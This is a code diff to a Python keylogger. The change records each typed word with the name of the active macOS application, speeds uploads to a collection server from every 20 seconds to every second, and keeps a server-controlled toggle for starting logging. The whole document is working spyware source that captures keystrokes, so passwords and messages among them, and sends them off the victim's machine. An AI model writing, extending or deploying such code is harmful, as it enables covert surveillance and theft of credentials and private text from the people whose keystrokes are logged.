@@ -6,20 +6,32 @@ from pynput import keyboard
 from pynput.keyboard import Key
 from cryptography.fernet import Fernet
 import platform
-
+# import win32gui # Windows
+from AppKit import NSWorkspace # macOS
 
 
 class KeyLoggerService:
     def __init__(self):
         self.key_log_dict = {}
         self.all_logs = []
+        self.current_word = ""
 
     def add_key(self, key):
         now_time = time.strftime("%d/%m/%y %H:%M", time.localtime())
-        if now_time in self.key_log_dict:
-            self.key_log_dict[now_time].append(str(key))
-        else:
-            self.key_log_dict[now_time] = [str(key)]
+        app_name = self.get_active_application()
+        key_str = str(key).replace("'", "")
+        if key == Key.space:
+            if self.current_word:
+                if now_time in self.key_log_dict:
+                    self.key_log_dict[now_time].append({"key": self.current_word, "app": app_name})
+                else:
+                    self.key_log_dict[now_time] = [{"key": self.current_word, "app": app_name}]
+                self.current_word = ""
+        elif key_str.isalnum() or key_str == "Key.backspace":
+            if key_str == "Key.backspace" and self.current_word:
+                self.current_word = self.current_word[:-1]
+            elif key_str != "Key.backspace":
+                self.current_word += key_str
 
     def save_and_clear(self):
         if self.key_log_dict:
@@ -33,8 +45,27 @@ class KeyLoggerService:
     def clear_logs(self):
         self.all_logs = []
 
+    @staticmethod
+    def get_active_application():
+        # if platform.system() == "Windows": # Windows
+        #     hwnd = win32gui.GetForegroundWindow() # Windows
+        #     return win32gui.GetWindowText(hwnd) or "Unknown" # Windows
+
+        if platform.system() == "Darwin": # macOS
+            active_app = NSWorkspace.sharedWorkspace().activeApplication() # macOS
+            return active_app.get("NSApplicationName", "Unknown") # macOS
+        return "Unsupported"
+
+    def format_logs(self):
+        result = []
+        for log_dict in self.all_logs:
+            for time_key, entries in log_dict.items():
+                for entry in entries:
+                    result.append(f"[{time_key}] ({entry['app']}): {entry['key']}")
+        return "\n".join(result)
+
 class ServerSender:
-    def __init__(self, server_url, service, machine_name= platform.node() ):
+    def __init__(self, server_url, service, machine_name=platform.node()):
         self.server_url = server_url
         self.service = service
         self.machine_name = machine_name
@@ -58,11 +89,10 @@ class ServerSender:
                         print(f"Upload failed: {response.status_code} {response.text}")
                     else:
                         print("Upload OK")
-                        # Clear logs only on successful upload
                         self.service.clear_logs()
                 except requests.exceptions.RequestException as e:
                     print(f"Error sending data: {e}")
-            time.sleep(20)
+            time.sleep(1)
 
 class KeyLoggerManager:
     def __init__(self):
@@ -71,13 +101,12 @@ class KeyLoggerManager:
         self.server_base = "http://127.0.0.1:5000"
         self.server_sender = ServerSender(f"{self.server_base}/api/upload", self.service, self.machine_name)
         self.listener = None
-        # Start background poller to follow desired toggle state from server
         threading.Thread(target=self._poll_toggle_state, daemon=True).start()
 
     def handle_key_press(self, key):
         self.service.add_key(key)
         if key == Key.space:
-            logs = self.service.save_and_clear()
+            self.service.save_and_clear()
 
     def start(self):
         if not self.listener:
